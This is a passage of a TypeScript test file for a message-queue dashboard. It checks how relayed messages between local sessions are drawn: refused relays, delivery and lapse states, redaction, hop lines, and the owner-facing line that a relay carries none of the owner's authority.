  for (const row of ends) test(`the list's end: ${row.name}`, () => assert.deepEqual(endOf(row.done, row.relays), row.expected));

  // the relay thread pages refusals by time span: each record lands on one page, cut past the server's page bound
  const prev = { items: [], nextCursor: cursorAt(400, 1), refusals: [{ at: atMinutes(100) }, { at: atMinutes(300) }], refusalCutAt: null };
  const refusalReads = [
    { name: "a re-read takes its span's refusals and keeps the loaded ones older than its span", page: { items: [], nextCursor: cursorAt(200, 1), refusals: [{ at: atMinutes(50) }] }, before: null, isQuiet: true, expected: { refusals: [50, 300], cutAt: null } },
    { name: "a whole re-read takes every refusal from the read", page: { items: [], nextCursor: null, refusals: [{ at: atMinutes(50) }] }, before: null, isQuiet: true, expected: { refusals: [50], cutAt: null } },
    { name: "a cut re-read keeps the loaded refusals older than its oldest listed one", page: { items: [], nextCursor: cursorAt(200, 1), refusals: [{ at: atMinutes(50) }, { at: atMinutes(90) }], isRefusalListCut: true }, before: null, isQuiet: true, expected: { refusals: [50, 90, 100, 300], cutAt: null } },
    { name: "a cut first page marks the cut at its oldest listed refusal", page: { items: [], nextCursor: cursorAt(200, 1), refusals: [{ at: atMinutes(50) }, { at: atMinutes(90) }], isRefusalListCut: true }, before: null, isQuiet: false, expected: { refusals: [50, 90], cutAt: 90 } },
    { name: "an earlier page keeps the newer cut", page: { items: [], nextCursor: null, refusals: [{ at: atMinutes(500) }], isRefusalListCut: true }, before: cursorAt(400, 1), isQuiet: false, prev: { ...prev, refusalCutAt: atMinutes(90) }, expected: { refusals: [100, 300, 500], cutAt: 90 } },
  ];
  const minutesOf = (iso: string) => Math.round((FIXTURE_NOW - Date.parse(iso)) / 60_000);
  for (const row of refusalReads) {
    test(`refusal pages: ${row.name}`, () => {
      const read = call<{ refusals: Array<{ at: string }>; refusalCutAt: string | null }>("getReadThreadQ", row.prev ?? prev, row.page, row.before, row.isQuiet);
      const refusals = read.refusals.map((refusal) => minutesOf(refusal.at)).sort((left, right) => left - right);
      assert.deepEqual({ refusals, cutAt: read.refusalCutAt === null ? null : minutesOf(read.refusalCutAt) }, row.expected);
    });
  }

  // layout §2 → Refused: the fixture's pair_cap refusal, gersona (25a65a54) to yoaida (fa32c7cb), 2026-11-13 12:00 KST, names from the loaded relays
  const refusedQueue = () => {
    const base = buildQueue().queue;
    const groups = getGroups([], { done: thread(), relays: relayRead() });
    const row = groups.flatMap((group) => group.rows).find((entry) => entry.refusal)!;
    return { queue: { ...base, relays: { ...base.relays, thread: relayRead() }, groups, sheet: call("getSheetStateQ", groups, String(row.id), null) }, row };
  };
  const flatText = (node: RenderedNode) => collectText(node).replace(/\s+/g, " ").trim();

  test("a refused row opens its own sheet and counts among the rows the sheet steps through", () => {
    const { queue, row } = refusedQueue();
    const pressed: unknown[] = [];
    const tree = render("QueueRowQ", { row, names: new Map(), isSelected: false, cols: ["tag", "fact"], view: { isNameShown: true, isAccountShown: false, tabStopId: null }, onSelect: (id: unknown) => pressed.push(id), onOrder: () => pressed.push("order") });
    (findNodes(tree, (node) => node.props?.role === "option")[0]?.props.onClick as () => void)();
    const steps = call<{ index: number }>("getStepsQ", queue.groups, row.id, -1);
    // the redacted relay on its way stands above it under In delivery; the refusal is the newest Done row
    assert.deepEqual([pressed, (queue.sheet as { kind: string; id: unknown }).kind, (queue.sheet as { id: unknown }).id, steps.index], [[row.id], "item", row.id, 1]);
  });

  test("a refused relay's sheet: the two ends in the head, the refusal and its time on the date line, the page's own title, From and To with their ids, the reason, no text", () => {
    const tree = render("QueueSheetQ", { queue: refusedQueue().queue });
    const [head] = findNodes(tree, (node) => node.type === "h2");
    const [title] = findNodes(tree, (node) => node.type === "h3");
    const body = flatText(byClass(tree, "queue-sheet-body")[0] as RenderedNode);
    assert.deepEqual(
      {
        head: flatText(head as RenderedNode), title: collectText(title as RenderedNode), date: flatText(byClass(tree, "queue-date-line")[0] as RenderedNode),
        parts: ["From gersona (self-named) · 25a65a54", "To yoaida (self-named) · fa32c7cb", "Too many to one session — gersona (self-named) hit the hourly limit for yoaida (self-named).", "Its text was not stored."].map((part) => body.includes(part)),
        crit: findNodes(byClass(tree, "queue-date-line")[0] as RenderedNode, (node) => node.props?.className === "text-crit").map(flatText),
      },
      { head: "Relay from gersona (self-named) → to yoaida (self-named)", title: "Refused relay from gersona (self-named) to yoaida (self-named)", date: "✕ Refused 2026-11-13 12:00 KST", parts: [true, true, true, true], crit: ["✕"] },
    );
  });

  test("a refused relay's sheet carries the no-login sentence alone, since nothing arrived, and its foot only says when: no field, no button", () => {
    const tree = render("QueueSheetQ", { queue: refusedQueue().queue });
    const text = flatText(tree);
    const [foot] = byClass(tree, "card-foot");
    assert.deepEqual(
      [text.includes("No login: any local process can send as any session, or redact."), text.includes("sent this as its message"), flatText(foot as RenderedNode), findNodes(foot as RenderedNode, (node) => ["button", "textarea", "input"].includes(String(node.type))).length],
      [true, false, "Refused · Nov 13 12:00", 0],
    );
  });

  test("a refusal to no resolvable session names the count on its To line", () => {
    const refusal = { ...REFUSAL!, recipientIdPrefixes: [], unresolvedCount: 1 };
    const text = flatText(render("RefusedWhoQ", { refusal, names: new Map() }));
    assert.equal(text, "From 25a65a54 To → 1 recipient that matched no session");
  });

  test("O on a refused row ticks the rail's sessions its recipient ids name, never its sender", () => {
    const rails = [{ id: FIXTURE_SESSION_IDS.yoaida, sessionIdPrefix: FIXTURE_SESSION_IDS.yoaida.slice(0, 8) }, { id: FIXTURE_SESSION_IDS.gersona, sessionIdPrefix: FIXTURE_SESSION_IDS.gersona.slice(0, 8) }];
    assert.deepEqual(call("getOrderKeyIdsQ", refusedQueue().row, rails), [FIXTURE_SESSION_IDS.yoaida]);
  });
});

// spec §4.2, §9.9: a relay on its way — a row under In delivery on the list's own columns, and the list's sheet read-only
describe("a relay on its way", () => {
  const TITLE = "필드 이름이 바뀌었습니다.";
  const BODY = `${TITLE}\n요아이다 쪽 문서도 같은 이름으로 맞춰 주세요.`;
  const sender = { sessionIdPrefix: "aca91592", profileLabel: "work", selfDeclaredName: "aidl", cwdTail: "git/a-idl" };
  const NAMED = "aidl (self-named)";
  // one copy per recipient under one send id, as the open list returns them: answered at the send, the title the text's first line
  const buildCopies = (recipients: Array<[string, Record<string, unknown>]>, facts: Record<string, unknown> = {}) =>
    recipients.map(([name, overrides], index) => buildItem({
      id: 412 + index, kind: "relay", title: TITLE, body: BODY, options: [], isFreeTextAllowed: false, status: "answered",
      askedAt: "2026-11-19T05:20:00.000Z", answeredAt: "2026-11-19T05:20:00.000Z", sendId: "relay-send-1",
      session: buildSession({ id: `5e55a0${index}0-0000-4000-8000-000000000000`, sessionIdPrefix: `5e55a0${index}0`, name, state: "live", isWaiting: true }),
      relay: { hop: 0, parent: null, sender, fetchedAt: null, redaction: null, lapsedAt: null, ...facts },
      ...overrides,
    }));
  const toYoaida = (overrides: Record<string, unknown> = {}, facts: Record<string, unknown> = {}) => buildCopies([["yoaida", overrides]], facts);
  const toThree = () => buildCopies([["yoaida", { status: "delivered", deliveredAt: "2026-11-19T05:24:00.000Z" }], ["atrium", {}], ["gersona", {}]]);
  const renderRow = (copies: Array<{ id: number }>, isNameShown = true, handlers: Record<string, unknown> = {}) =>
    render("QueueRowQ", { row: { id: copies[0]!.id, item: copies[0], copies }, isSelected: false, cols: ["tag", "fact"], view: { isNameShown, isAccountShown: false, tabStopId: copies[0]!.id }, onSelect: () => undefined, onOrder: () => undefined, ...handlers });
  const cellText = (tree: RenderedNode, name: string) => {
    const [cell] = byClass(tree, name);
    return cell === undefined ? null : collectText(cell).replace(/\s+/g, " ").trim();
  };
  const getRowShape = (tree: RenderedNode) => {
    const [row] = findNodes(tree, (node) => node.props?.role === "option");
    return {
      who: cellText(tree, "queue-row-name"),
      mark: cellText(tree, "queue-row-mark"),
      title: cellText(tree, "queue-row-title"),
      tags: findNodes(byClass(tree, "queue-row-tag")[0] as RenderedNode, (node) => node.props?.atom === "Badge").map((badge) => badge.props.title),
      fact: cellText(tree, "queue-row-fact"),
      label: String(row?.props["aria-label"]).split(", sent ")[0],
    };
  };

  const rows = [
    {
      name: "to one session it names its sender, leads its title with the recipient and reads Relay", copies: toYoaida(), isNameShown: true,
      shape: { who: "aidl", mark: "self", title: `→ yoaida ${TITLE}`, tags: [], fact: "Relay", label: `Relay from ${NAMED} to yoaida: ${TITLE}` },
    },
    {
      name: "to several it names their count and reads received of sent", copies: toThree(), isNameShown: true,
      shape: { who: "aidl", mark: "self", title: `→ 3 sessions ${TITLE}`, tags: [], fact: "1 of 3", label: `Relay from ${NAMED} to 3 sessions: ${TITLE}, 1 of 3` },
    },
    {
      name: "a copy its session never acknowledged is not yet, never not received", copies: toYoaida({ status: "unacked", deviation: "unacked" }), isNameShown: true,
      shape: { who: "aidl", mark: "self", title: `→ yoaida ${TITLE}`, tags: [], fact: "Relay", label: `Relay from ${NAMED} to yoaida: ${TITLE}` },
    },
    {
      name: "a copy whose session does not listen is counted in the tag column", copies: toYoaida({ session: buildSession({ name: "yoaida", state: "live", isWaiting: false }) }), isNameShown: true,
      shape: { who: "aidl", mark: "self", title: `→ yoaida ${TITLE}`, tags: ["1 next turn"], fact: "Relay", label: `Relay from ${NAMED} to yoaida: ${TITLE}, 1 next turn` },
    },
    {
      name: "a redacted relay reads Text redacted where its title stood", copies: toYoaida({}, { redaction: { at: "2026-11-19T05:30:00.000Z", length: 64 } }), isNameShown: true,
      shape: { who: "aidl", mark: "self", title: "→ yoaida Text redacted", tags: [], fact: "Relay", label: `Relay from ${NAMED} to yoaida: Text redacted` },
    },
  ];
  for (const row of rows) {
    test(`a relay's row: ${row.name}`, () => {
      const tree = renderRow(row.copies, row.isNameShown);
      assert.deepEqual(getRowShape(tree), row.shape);
      assert.match(String(findNodes(tree, (node) => node.props?.role === "option")[0]?.props["aria-label"]), /, sent \S+ ago$/);
    });
  }

  // one session ticked → the sender's name is cut on its own, its self mark stays whole, and the recipient and title are cut on their own
  test("with one session ticked the title cell leads with the sender's name and its self mark, each its own part before the recipient and title", () => {
    const tree = renderRow(toYoaida(), false);
    const [cell] = byClass(tree, "queue-row-title");
    const partOf = (node: unknown) => {
      const part = node as RenderedNode;
      return { className: part.props?.className, text: collectText(part).replace(/\s+/g, " ").trim(), tip: part.props?.title, isHidden: part.props?.["aria-hidden"] === "true" };
    };
    const [from, ends] = (cell?.children ?? []).filter((child) => typeof child === "object" && child !== null) as RenderedNode[];
    assert.deepEqual({
      cell: { names: byClass(tree, "queue-row-who").length, tip: cell?.props.title, parts: [from, ends].map((part) => part?.props.className) },
      from: findNodes(from!, (node) => node !== from && String(node.props?.className ?? "").startsWith("queue-row-")).map(partOf),
      ends: collectText(ends!).replace(/\s+/g, " ").trim(),
      label: getRowShape(tree).label,
    }, {
      cell: { names: 0, tip: TITLE, parts: ["queue-row-from", "queue-row-ends"] },
      from: [
        { className: "queue-row-name", text: "aidl", tip: NAMED, isHidden: false },
        { className: "queue-row-mark", text: "self", tip: "self-named", isHidden: true },
      ],
      ends: `→ yoaida ${TITLE}`,
      label: `Relay from ${NAMED} to yoaida: ${TITLE}`,
    });
  });

  test("a redacted relay's stored text is drawn nowhere on its row or its sheet", () => {
    const copies = toYoaida({}, { redaction: { at: "2026-11-19T05:30:00.000Z", length: 64 } });
    const queue = withList(buildQueue().queue, copies);
    const sheet = render("QueueSheetQ", { queue: { ...queue, sheet: getSheet(queue.groups, "412") } });
    // every drawn string and every prop string, a prose atom's text and a title included
    const props = [...findNodes(renderRow(copies), () => true), ...findNodes(sheet, () => true)].flatMap((node) => Object.values(node.props ?? {})).filter((value) => typeof value === "string");
    const texts = [collectText(renderRow(copies)), collectText(sheet), ...props];
    assert.deepEqual(texts.filter((text) => text.includes("필드") || text.includes("요아이다")), []);
    assert.match(collectText(sheet), /Text redacted/);
  });

  test("a relay's row opens its sheet, never the Orders pane, and counts among the rows the sheet steps through", () => {
    const pressed: string[] = [];
    const copies = toThree();
    const [row] = findNodes(renderRow(copies, true, { onSelect: () => pressed.push("sheet"), onOrder: () => pressed.push("orders") }), (node) => node.props?.role === "option");
    (row?.props.onClick as () => void)();
    const groups = call("getGroupsQ", [buildItem({ id: 3 }), ...copies]);
    const sheet = call<{ kind: string; id: number }>("getSheetStateQ", groups, "412", null);
    const steps = call<{ index: number; count: number }>("getStepsQ", groups, 412, -1);
    assert.deepEqual([pressed, sheet.kind, sheet.id, steps.index, steps.count], [["sheet"], "item", 412, 1, 2]);
  });

  const getSheetShape = (copies: Array<{ id: number }>) => {
    const queue = withList(buildQueue().queue, copies);
    const tree = render("QueueSheetQ", { queue: { ...queue, sheet: getSheet(queue.groups, "412") } });
    const [foot] = byClass(tree, "card-foot");
    const [head] = findNodes(tree, (node) => node.type === "h2");
    const [title] = findNodes(tree, (node) => node.type === "h3");
    const [date] = byClass(tree, "queue-date-line");
    return {
      head: collectText(head as RenderedNode).replace(/\s+/g, " ").trim(),
      title: collectText(title as RenderedNode),
      date: collectText(date as RenderedNode),
      foot: collectText(foot as RenderedNode).replace(/\s+/g, " ").trim(),
      controls: findNodes(foot as RenderedNode, (node) => ["textarea", "input"].includes(String(node.type))).length,
      buttons: findNodes(foot as RenderedNode, (node) => node.type === "button").map((node) => [collectText(node), node.props.className]),
      body: collectText(byClass(tree, "queue-sheet-body")[0] as RenderedNode),
    };
  };
  const QUIET_REDACT = [["Redact text", "btn ghost sm"]];

  test("a relay to one session opens read-only: its two ends in the head and title, no field, and its one act a quiet Redact text at the foot's end", () => {
    const shape = getSheetShape(toYoaida());
    assert.deepEqual(
      { head: shape.head, title: shape.title, foot: shape.foot, controls: shape.controls, buttons: shape.buttons },
      { head: `Relay from ${NAMED} → to yoaida`, title: `Message from ${NAMED} to yoaida`, foot: "Read-only. It reaches yoaida by itself. Redact text", controls: 0, buttons: QUIET_REDACT },
    );
    assert.match(shape.date, /^Not yet\s+Sent\s+2026-11-19 14:20 KST$/);
    for (const part of [`What ${NAMED} wrote`, `${NAMED} sent this as its message, not yours.`, "It carries none of your authority."]) assert.ok(shape.body.includes(part), part);
    assert.doesNotMatch(shape.body, /Run in that session|Answered/);
  });

  test("a relay to several sessions reads received of sent on its sheet, and its foot names each session", () => {
    const shape = getSheetShape(toThree());
    assert.deepEqual(
      { head: shape.head, title: shape.title, foot: shape.foot, controls: shape.controls },
      { head: `Relay from ${NAMED} → to 3 sessions`, title: `Message from ${NAMED} to 3 sessions`, foot: "Read-only. It reaches each session by itself. Redact text", controls: 0 },
    );
    assert.match(shape.date, /^1 of 3 received/);
  });

  // a peer writes its own name → wherever the queue names the sender, a written name is marked as the sender's own
  const NAME_ROWS = [
    { name: "a name the sender gave itself is marked self-named", sender, shown: NAMED, cell: { who: "aidl", mark: "self" } },
    { name: "a sender that gave no name reads as its id prefix, unmarked", sender: { ...sender, selfDeclaredName: null }, shown: "aca91592", cell: { who: "aca91592", mark: null } },
  ];
  for (const row of NAME_ROWS) {
    test(`the sender in the row's name column, the sheet head, the sheet title, the From line, the text's label and the standing line: ${row.name}`, () => {
      const copies = toYoaida({}, { sender: row.sender });
      const sheet = getSheetShape(copies);
      const body = sheet.body.replace(/\s+/g, " ");
      assert.deepEqual(
        {
          cell: (({ who, mark }) => ({ who, mark }))(getRowShape(renderRow(copies))), head: sheet.head, title: sheet.title, from: body.includes(`From ${row.shown} · aca91592 · work`),
          label: body.includes(`What ${row.shown} wrote`), standing: body.includes(`${row.shown} sent this as its message, not yours.`),
        },
        { cell: row.cell, head: `Relay from ${row.shown} → to yoaida`, title: `Message from ${row.shown} to yoaida`, from: true, label: true, standing: true },
      );
    });
  }

  test("a relay's text on its sheet is one pre-wrap text node, whole and unparsed, under its label and the shown-as-sent cue", () => {
    const queue = withList(buildQueue().queue, toYoaida({ body: EVERY_BLOCK_FORM }));
    const [block] = byClass(render("QueueSheetQ", { queue: { ...queue, sheet: getSheet(queue.groups, "412") } }), "queue-sheet-body");
    assert.deepEqual(getAsSentTexts(block as RenderedNode), [EVERY_BLOCK_FORM]);
    assert.equal(findNodes(block as RenderedNode, (node) => node.props?.atom === "ProseText").length, 0);
    assert.ok(collectText(block as RenderedNode).replace(/\s+/g, " ").includes(`What ${NAMED} wrote · shown as sent`));
  });

  test("a relay whose text addresses its declared document still lists it on the Documents line: the text as sent links none", () => {
    const queue = withList(buildQueue().queue, toYoaida({ body: "근거: clauded-docs/44099 의 응답 예시", linkedDocIds: [44099] }));
    const [block] = byClass(render("QueueSheetQ", { queue: { ...queue, sheet: getSheet(queue.groups, "412") } }), "queue-sheet-body");
    const links = findNodes(block as RenderedNode, (node) => node.type === "a").map((node) => [collectText(node), node.props.href]);
    assert.deepEqual(links, [["44099", "#clauded-docs?doc=44099"]]);
  });

  // spec §9.9 Part 3: the sheet keeps a relay after its row leaves — the copies it last had, its outcome read from the relay thread
  const RECIPIENT_IDS = [0, 1, 2].map((index) => `5e55a0${index}0-0000-4000-8000-000000000000`);
  const leftRows = [
    { name: "a relay whose row left keeps its sheet with every copy it last had", items: [buildItem({ id: 3 })], ids: [], expected: { kind: "left", id: 412, copies: [412, 413, 414] } },
    { name: "a relay whose row still stands stays its row's sheet", items: toThree(), ids: [], expected: { kind: "item", id: 412, copies: null } },
    { name: "a relay whose row left keeps its sheet while a recipient other than the first is ticked", items: [], ids: [RECIPIENT_IDS[2]], expected: { kind: "left", id: 412, copies: [412, 413, 414] } },
    { name: "a relay whose row left gives way to the list once neither end is ticked", items: [], ids: [SESSION_ID], expected: { kind: "none", id: null, copies: null } },
  ];
  for (const row of leftRows) {
    test(`the sheet's state: ${row.name}`, () => {
      const copies = toThree();
      const sheet = call<{ kind: string; id: number | null; copies?: Array<{ id: number }> }>("getSheetStateQ", call("getGroupsQ", row.items), "412", { item: copies[0], copies }, row.ids);
      assert.deepEqual({ kind: sheet.kind, id: sheet.id, copies: sheet.copies?.map((copy) => copy.id) ?? null }, row.expected);
    });
  }

  // spec §9.9 Part 4: a To line's state is the rail's, by id — a mark and a word; a recipient off the rail reads its copy's session, every exit Ended
  const rail = (overrides: Record<string, unknown>) => ({ id: RECIPIENT_IDS[0], sessionIdPrefix: "5e55a000", name: "yoaida", state: "live", exitReason: null, isWaiting: true, isSelectable: true, ...overrides });
  const toLines = (copies: unknown[], rails: unknown[]) => byClass(render("RelayWhoQ", { sender, copies, rails }), "queue-relay-to");
  const stateRows = [
    { name: "live and listening on the rail reads Live by the live dot", rails: [rail({})], session: {}, state: ["is-live", "Live"] },
    { name: "live and not listening reads Next turn by the pause glyph", rails: [rail({ isWaiting: false })], session: {}, state: ["is-pause", "Next turn"] },
    { name: "not reachable reads Not reachable by the warn sign", rails: [rail({ state: "stale" })], session: {}, state: ["is-warn", "Not reachable"] },
    { name: "ended reads Ended by the hollow ring", rails: [rail({ state: "exited", exitReason: "ended" })], session: {}, state: ["is-ended", "Ended"] },
    { name: "replaced reads Replaced by the hollow ring", rails: [rail({ state: "exited", exitReason: "replaced", isSelectable: false })], session: {}, state: ["is-ended", "Replaced"] },
    { name: "off the rail its copy's session decides, an exit reading Ended", rails: [], session: { state: "exited", isWaiting: false }, state: ["is-ended", "Ended"] },
    { name: "the rail outranks the copy's session as read", rails: [rail({ isWaiting: false })], session: { state: "live", isWaiting: true }, state: ["is-pause", "Next turn"] },
  ];
  for (const row of stateRows) {
    test(`a To line's state: ${row.name}`, () => {
      const [copy] = toYoaida();
      const [line] = toLines([{ ...copy, session: { ...(copy!.session as object), ...row.session } }], row.rails);
      const marks = findNodes(line as RenderedNode, (node) => String(node.props?.className ?? "").startsWith("queue-state-mark"));
      const hidden = findNodes(line as RenderedNode, (node) => node.props?.["aria-hidden"] === "true" && findNodes(node, (inner) => inner === marks[0]).length > 0);
      assert.deepEqual(
        [marks.map((mark) => String(mark.props.className).split(" ")[1]), hidden.length > 0, collectText(line as RenderedNode).replace(/\s+/g, " ").trim().endsWith(row.state[1]!)],
        [[row.state[0]], true, true],
      );
    });
  }

  test("with several recipients each To line reads its state, then its own receipt, a lapsed copy Lapsed", () => {
    const copies = toThree().map((copy, index) => (index === 1 ? lapse(copy) : copy));
    const lines = toLines(copies, []).map((line) => collectText(line).replace(/\s+/g, " ").trim());
    assert.deepEqual(lines.map((line) => line.replace(/^.* · /, "")), ["Live ✓ Received", "Live ⚠ Lapsed", "Live Not yet"]);
  });

  const endedRows = [
    { name: "an ended recipient not yet reached shows it", session: { state: "exited" }, copy: {}, isShown: true },
    { name: "an ended recipient that received it shows none", session: { state: "exited" }, copy: { status: "delivered", deliveredAt: "2026-11-19T05:24:00.000Z" }, isShown: false },
    { name: "a live recipient not yet reached shows none", session: {}, copy: {}, isShown: false },
  ];
  for (const row of endedRows) {
    test(`the Ended line: ${row.name}`, () => {
      const [copy] = toYoaida(row.copy);
      const copies = [{ ...copy, session: { ...(copy!.session as object), ...row.session } }];
      const text = collectText(render("RelayBlockQ", { item: copies[0], copies, rails: [] }));
      assert.equal(text.includes("Ended recipients are not resumed for a relay; it may lapse."), row.isShown);
    });
  }

  // one short painted line keeps both names' self-named marks in view; spec §12.7's full sentence in its title and to a reader;
  // the parent's send on another day than this send → dated
  const hopSentence = `Hop 1 · sent after ${NAMED} received relay #398 from atrium (self-named) at 2026-11-18 12:00`;
  const hopRows = [
    {
      name: "a relay passed on paints its parent's relay id, sender and send time in one short line, the full sentence in its title and to a reader",
      facts: { hop: 1, parent: { id: 398, sender: { ...sender, sessionIdPrefix: "e8923338", selfDeclaredName: "atrium" }, sentAt: "2026-11-18T03:00:00.000Z" } },
      lines: [{ shown: "Hop 1 · passed on from #398 · atrium (self-named) · 2026-11-18 12:00", title: hopSentence, spoken: hopSentence }],
    },
    { name: "a relay sent first has none", facts: {}, lines: [] },
  ];
  for (const row of hopRows) {
    test(`the hop line on a relay's sheet: ${row.name}`, () => {
      const copies = toYoaida({}, row.facts);
      const paragraphs = findNodes(render("RelayBlockQ", { item: copies[0], copies, rails: [] }), (node) => node.type === "p" && collectText(node).trim().startsWith("Hop"));
      const textOf = (node: RenderedNode, isPart: (part: RenderedNode) => boolean) => findNodes(node, isPart).map((part) => collectText(part).replace(/\s+/g, " ").trim()).join("");
      assert.deepEqual(paragraphs.map((node) => ({
        shown: textOf(node, (part) => part.props?.["aria-hidden"] === "true"),
        title: node.props.title,
        spoken: textOf(node, (part) => part.props?.className === "sr-only"),
      })), row.lines);
    });
  }

  test("a relay whose row left keeps a To line for every recipient it last had", () => {
    const copies = toThree();
    const queue = withList(buildQueue().queue, [buildItem({ id: 3 })]);
    const body = collectText(byClass(render("QueueSheetQ", { queue: { ...queue, sheet: { kind: "left", id: 412, item: copies[0], copies } } }), "queue-sheet-body")[0] as RenderedNode).replace(/\s+/g, " ");
    assert.deepEqual(["yoaida", "atrium", "gersona"].map((name) => body.includes(`${name} · 5e55a0`)), [true, true, true]);
  });

  // a relay gone from the list has no place to step from → its arrows dim, and neither a press nor J / K steps
  test("a relay whose row left draws its step arrows aria-disabled and steps nowhere, by press or by key", () => {
    const copies = toThree();
    const { calls, queue } = buildQueue({ steps: { index: -1, count: 3, prevId: 5, nextId: 7 } });
    const left = { ...withList(queue, [buildItem({ id: 3 })]), sheet: { kind: "left", id: 412, item: copies[0], copies } };
    const [head] = byClass(render("QueueSheetQ", { queue: left }), "card-head");
    const arrows = findNodes(head as RenderedNode, (node) => node.type === "button" && / item$/.test(String(node.props["aria-label"])));
    for (const arrow of arrows) (arrow.props.onClick as (() => void) | undefined)?.();
    for (const key of ["ArrowDown", "ArrowUp"]) call("putSteppedRowQ", { queue: left }, key);
    assert.deepEqual(
      [arrows.map((arrow) => [arrow.props["aria-label"], arrow.props["aria-disabled"], Boolean(arrow.props.disabled)]), getPlain(calls)],
      [[["Previous item", true, false], ["Next item", true, false]], []],
    );
  });

  // the fixture's times in KST: sent Nov 19 14:20, received 14:24 the same day, lapsed Nov 22 14:20
  const lapse = (copy: Record<string, unknown>) => ({ ...copy, status: "expired", relay: { ...(copy.relay as object), lapsedAt: "2026-11-22T05:20:00.000Z" } });
  const receive = (copy: Record<string, unknown>) => ({ ...copy, status: "delivered", deliveredAt: "2026-11-19T05:24:00.000Z" });
  const ended = (lapsed: number) => toThree().map((copy, index) => (index < lapsed ? lapse(copy) : receive(copy)));
  const REDACTION = { at: "2026-11-19T05:30:00.000Z", length: 1284 };
  const redacted = (copies: Array<Record<string, unknown>>) => copies.map((copy) => ({ ...copy, relay: { ...(copy.relay as object), redaction: REDACTION } }));
  const flatText = (node: RenderedNode) => collectText(node).replace(/\s+/g, " ").replace(/ \./g, ".").trim();

  // layout §2 → Foot: the note line, and the quiet Redact text at its end only while a copy holds its text
  const footRows = [
    { name: "on its way to one session it reaches it by itself", copies: toYoaida(), props: {}, note: "Read-only. It reaches yoaida by itself.", buttons: QUIET_REDACT },
    { name: "on its way to several it reaches each by itself", copies: toThree(), props: {}, note: "Read-only. It reaches each session by itself.", buttons: QUIET_REDACT },
    { name: "done and received reads how and when it ended", copies: [receive(toYoaida()[0]!)], props: { isDone: true }, note: "Received · Nov 19 14:24", buttons: QUIET_REDACT },
    { name: "done with some lapsed counts each, at the last copy's end", copies: ended(1), props: { isDone: true }, note: "2 received, 1 lapsed · Nov 22 14:20", buttons: QUIET_REDACT },
    { name: "done with every copy lapsed reads Lapsed", copies: ended(3), props: { isDone: true }, note: "Lapsed · Nov 22 14:20", buttons: QUIET_REDACT },
    { name: "redacted on its way keeps the note and offers nothing", copies: redacted(toYoaida()), props: {}, note: "Read-only. It reaches yoaida by itself.", buttons: [] },
    { name: "redacted and done keeps the end line and offers nothing", copies: redacted(ended(1)), props: { isDone: true }, note: "2 received, 1 lapsed · Nov 22 14:20", buttons: [] },
    { name: "a row that left the list says so and offers nothing", copies: toThree(), props: { hasLeft: true }, note: "ℹ This relay left the list.", buttons: [] },
  ];
  for (const row of footRows) {
    test(`a relay's foot: ${row.name}`, () => {
      const tree = render("RelayFootQ", { copies: row.copies, onReread: () => undefined, ...row.props });
      const [note] = findNodes(tree, (node) => node.props?.role === "status");
      const buttons = findNodes(tree, (node) => node.type === "button").map((node) => [collectText(node), node.props.className]);
      assert.deepEqual([flatText(note as RenderedNode), buttons], [row.note, row.buttons]);
    });
  }

  test("each To line carries its relay id after its session id, and once every copy ended its outcome and when, the lapse on another day dated", () => {
    const lines = byClass(render("RelayWhoQ", { sender, copies: ended(1), rails: [], isDone: true }), "queue-relay-to").map(flatText);
    assert.deepEqual(
      lines.map((line) => [line.match(/5e55a0\d0 #\d+/)?.[0], line.replace(/^.* · /, "")]),
      [["5e55a000 #412", "Live ⚠ Lapsed Nov 22 14:20"], ["5e55a010 #413", "Live ✓ Received 14:24"], ["5e55a020 #414", "Live ✓ Received 14:24"]],
    );
  });

  const dateRows = [
    { name: "one recipient reads its outcome and time", copies: [receive(toYoaida()[0]!)], date: "✓ Received 14:24 Sent 2026-11-19 14:20 KST" },
    { name: "several read how many of each", copies: ended(1), date: "2 received, 1 lapsed Sent 2026-11-19 14:20 KST" },
  ];
  for (const row of dateRows) {
    test(`a Done relay's date line: ${row.name}`, () => {
      const tree = renderSheet({ item: row.copies[0], copies: row.copies, queue: buildQueue().queue, isDone: true });
      assert.equal(flatText(byClass(tree, "queue-date-line")[0] as RenderedNode), row.date);
    });
  }

  test("a redacted relay's sheet paints the page's own line from the stored time and length in the text's place, under its label with no shown-as-sent cue, its documents line kept", () => {
    const copies = redacted(toYoaida({ body: "[relay text redacted by the owner]", linkedDocIds: [44099] }));
    const body = flatText(byClass(renderSheet({ item: copies[0], copies, queue: buildQueue().queue }), "queue-sheet-body")[0] as RenderedNode);
    assert.deepEqual(
      [body.includes("Text redacted 2026-11-19 14:30 KST · it was 1,284 characters long"), body.includes("relay text redacted by the owner"), body.includes("Documents: 44099"), / wrote/.test(body), body.includes("shown as sent")],
      [true, false, true, true, false],
    );
  });

  test("a send with one copy still holding its text keeps that text on its sheet and its Redact text", () => {
    const [gone, kept] = toThree();
    const copies = [...redacted([{ ...gone!, body: "[relay text redacted by the owner]" }]), kept!];
    const tree = renderSheet({ item: copies[0], copies, queue: buildQueue().queue });
    assert.deepEqual([getAsSentTexts(tree), buttonLabelled(tree, "Redact text").length], [[BODY], 1]);
  });

  // layout §6 → Trust: whatever its state, a relay's sheet says whose word it is and that the queue has no login; nothing on it sends
  const trustRows = [
    { name: "on its way", copies: toThree(), isDone: false },
    { name: "done", copies: ended(1), isDone: true },
    { name: "redacted", copies: redacted(ended(1)), isDone: true },
  ];
  for (const row of trustRows) {
    test(`a relay's sheet carries the standing line and the no-login sentence, and no field or ink button: ${row.name}`, () => {
      const tree = renderSheet({ item: row.copies[0], copies: row.copies, queue: buildQueue().queue, isDone: row.isDone });
      const text = flatText(tree);
      assert.deepEqual(
        [text.includes(`${NAMED} sent this as its message, not yours. It carries none of your authority.`), text.includes("No login: any local process can send as any session, or redact."), getSendControls(tree)],
        [true, true, 0],
      );
    });
  }
});

// a field, a box, or an ink button: what a sheet would send with
const getSendControls = (tree: RenderedNode) => findNodes(tree, (node) => ["textarea", "input"].includes(String(node.type)) || String(node.props?.className ?? "").split(" ").includes("primary")).length;

describe("selection", () => {
  const groups = call("getGroupsQ", [buildItem({ id: 5, kind: "report" }), buildItem({ id: 3 }), buildItem({ id: 8, kind: "message", status: "delivered", sendId: "s", session: buildSession({ id: "b2" }) }), buildItem({ id: 7, kind: "message", status: "delivered", sendId: "s" })]);
  const rows = [
    { name: "a loaded item named in the hash opens on the sheet", hashId: "5", expected: 5 },
    { name: "an order named in the hash opens nothing, since an order has no sheet", hashId: "8", expected: null },
    { name: "an item the list does not hold opens nothing", hashId: "99", expected: null },
    { name: "no item in the hash opens nothing, so the pane is the list", hashId: "", expected: null },
  ];
